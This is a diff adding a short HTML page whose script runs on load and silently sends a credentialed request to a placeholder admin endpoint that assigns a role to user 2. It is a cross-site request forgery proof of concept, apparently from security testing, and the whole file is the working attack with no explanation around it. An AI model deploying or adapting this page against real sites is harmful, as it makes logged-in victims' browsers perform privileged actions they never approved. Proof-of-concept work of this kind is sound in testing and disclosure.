@@ -1,0 +1,12 @@
+<html>
+<script>
+    function jsonreq() {
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.withCredentials = true;
+        xmlhttp.open("GET", "https://example.com/admin/user/2/assign", true);
+        xmlhttp.setRequestHeader("Content-Type", "text/plain");
+        xmlhttp.send();
+    }
+    jsonreq();
+</script>
+</html>
